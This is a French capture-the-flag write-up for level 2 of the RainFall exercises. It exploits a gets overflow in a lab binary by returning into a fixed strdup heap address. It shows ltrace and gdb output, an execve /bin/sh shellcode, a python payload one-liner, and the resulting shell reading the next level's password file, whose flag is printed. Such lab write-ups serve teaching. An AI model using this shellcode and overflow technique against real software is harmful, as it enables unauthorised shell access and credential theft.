
# Level 2

  

En ouvrant level2 avec cutter on voit que le main appelle une fonction p qui contient comme pour l'exercice precedant un gets exploitable, mais cette fois-ci le programme est protégé on ne peut donc pas exploiter la stack. Nous allons donc exploiter le heap (le tas).

La fonction fait un strdup du retour de gets, et on remarque que l'adresse de retour du malloc est fix, qu'on peut recupere grace a ltrace.

```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20) = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5l
) = 0xbffff70c
puts("l"l
) = 2
strdup("l") = 0x0804a008
+++ exited (status 8) +++
level2@RainFall:~$
```

Maintenant nous voulons écrire notre code pour que l'adresse mémoire retourner par le malloc soit en réalité notre exploitation. On trouve un shell code permettant de faire ça ici : http://shell-storm.org/shellcode/files/shellcode-575.php
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
Il nous reste a trouver la limite du malloc pour ce fair nous allons tenter de fair segfault le programe et recupere le nombre de character a rentre grace un buffer overflow generateur qu'on trouve ici : https://wiremask.eu/tools/buffer-overflow-pattern-generator/ , il suffit ensuite d'entre la chaine donner en utilisant *gdb* qui nous donnera l'addresse du segfault.
```
level2@RainFall:~$ gdb ./level2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law. Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/user/level2/level2
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
  
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb)
```
En enrant l'addresse dans le generateur on trouve un offset de 80 caractère. Comme dans le level précédent on créé donc notre payload qui sera donné en entré au programme. On commence donc par le shellcode qui permet de casser le binaire, puis on y ajoute des caractères quelconques pour atteindre la limite de mémoire et pour finir on y injecte l'adresse mémoire à laquelle on veut retourner notre programme. On lance le programme avec notre payload.

```
level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"
* 59 + "\x08\xa0\x04\x08"' > /tmp/payload
level2@RainFall:~$ cat /tmp/payload - | ./level2
X�Rh//shh/bin��1�̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```